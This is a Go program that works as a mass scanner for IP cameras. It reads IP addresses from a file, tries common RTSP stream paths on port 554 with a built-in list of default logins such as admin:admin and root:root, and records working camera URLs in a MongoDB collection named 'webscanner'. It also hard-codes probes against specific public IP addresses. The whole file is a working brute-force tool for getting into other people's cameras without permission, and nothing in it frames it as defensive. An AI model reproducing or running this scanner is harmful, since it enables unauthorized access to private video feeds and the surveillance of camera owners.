package main

import (
	"os"
	"fmt"
	"strings"
	"io/ioutil"
	"github.com/nareix/joy4/format/rtsp"
	"github.com/globalsign/mgo"
	"github.com/globalsign/mgo/bson"
)


var collection *mgo.Collection

func CheckRtspUrl(url string) error {
	Client,err := rtsp.DialTimeout(url,3*1000000000)
	if err!=nil{
		return err
	}
	err = Client.SetupAll()
	if err!=nil{
		Client.Close()
		return err
	}
	Client.Close()
	return nil
}


func CheckRtspIP(ip string) string {
	tail := []string{":554/mpeg4",":554/cam/realmonitor?channel=1&subtype=0",":554/h264/ch1/main/av_stream",":554/1/h264major",":554/huayu",":554/video1",":554/live2.sdp",":554/axis-media/media.amp?videocodec=h264"}
	auth := []string{"","admin:admin","admin:123456","admin:111111","admin:888888","admin:admin","admin:9999","root:pass","root:root","root:camera","admin:1234","admin:12345","root:admin","admin:4321","admin:","root:"}
	head := "rtsp://"
	tindex:=0
	aindex:=0
	for {
		authstr := auth[aindex]
		if authstr!=""{
			authstr+="@"
		}
		
		err :=CheckRtspUrl(head+authstr+ip+tail[tindex])
		if err==nil {
			err:=collection.Insert(bson.M{"url":head+authstr+ip+tail[tindex],"auth":"","status":true})
			if err!=nil{
				fmt.Println("ERROR IN INSERT",head+authstr+ip+tail[tindex])
			}
			fmt.Println("success",head+authstr+ip+tail[tindex])
			return head+authstr+ip+tail[tindex]
		} else{
			if strings.Contains(err.Error(), "timeout") || strings.Contains(err.Error(), "404") || strings.Contains(err.Error(), "403")|| strings.Contains(err.Error(), "EOF") || strings.Contains(err.Error(), "connection reset") || strings.Contains(err.Error(), "connection refused"){
				fmt.Println("timeout or 404",head+authstr+ip+tail[tindex])
				return ""
			} else if strings.Contains(err.Error(), "401") || strings.Contains(err.Error(), "username") {
				//fmt.Println("401",head+authstr+ip+tail[tindex])
				aindex++
			} else if strings.Contains(err.Error(), "400") {
				fmt.Println("400",head+authstr+ip+tail[tindex])
				var temp string
				err:=collection.Find(bson.M{"ip":ip}).One(&temp)
				if err!=nil && err.Error()=="not found" {
					err=collection.Insert(bson.M{"ip":ip,"status":"400"})
					if err!=nil{
						fmt.Println("ERROR IN INSERT",head+authstr+ip+tail[tindex])
					}
				} else if err!=nil {
					fmt.Println("ERROR IN FIND")
				}
				
				tindex++
				if tindex==8 {
					return ""
				}
			} else {
				fmt.Println("ELSE",err.Error())
				tindex++
				if tindex==8 {
					err:=collection.Insert(bson.M{"ip":ip,"status":"???"})
					if err!=nil{
						fmt.Println("ERROR IN INSERT",head+authstr+ip+tail[tindex])
					}
					return ""
				}
			}
		}
		if tindex==8 {
			err:=collection.Insert(bson.M{"ip":ip,"status":false})
			if err!=nil{
				fmt.Println("ERROR IN INSERT",head+authstr+ip+tail[tindex])
			}
		}
		if aindex==16 {
			return ""
		}
	}
}


func worker(info <-chan string, finish chan<- bool) {
    for {
        ip, ok := <- info
        if ok == false {
            finish <- true
            return
        }
        result := CheckRtspIP(ip)
        if result!="" {
            fmt.Println(result)
        }       
    }
}


func main(){
	
	session, err := mgo.Dial("10.245.146.33:27017")
	if err!=nil {
		fmt.Println("ERROR IN CONECT TO DB")
		os.Exit(-1)
	}
	collection = session.DB("webscanner").C("rtsp_0425")

	fmt.Printf(CheckRtspIP("123.234.180.124"))
	
	/*
	Client,err := rtsp.DialTimeout("rtsp://120.77.158.98:554/cam/realmonitor?channel=1&subtype=0",10*1000000000)
	fmt.Println(err)
	err = Client.SetupAll()
	
	fmt.Println(err.Error())
	err = Client.Close()
	fmt.Println(err)
	*/
	
	amount := 20
	info := make(chan string, 200)
    finish := make(chan bool, amount+1)
    for amount>0{
        amount--
        go worker(info,finish)
	}
	data, err := ioutil.ReadFile("554.txt")
	if err!=nil {
		fmt.Println("ERROR IN READ FILE")
		os.Exit(-1)
	}
	lines := strings.Split(string(data), "\n")
	for _,line := range lines{
		info <- strings.Replace(line,"\r","",1)
	}
	close(info)
	amount = 20
    for amount>0{
        amount--
        <- finish
    }

	session.Close()
	
}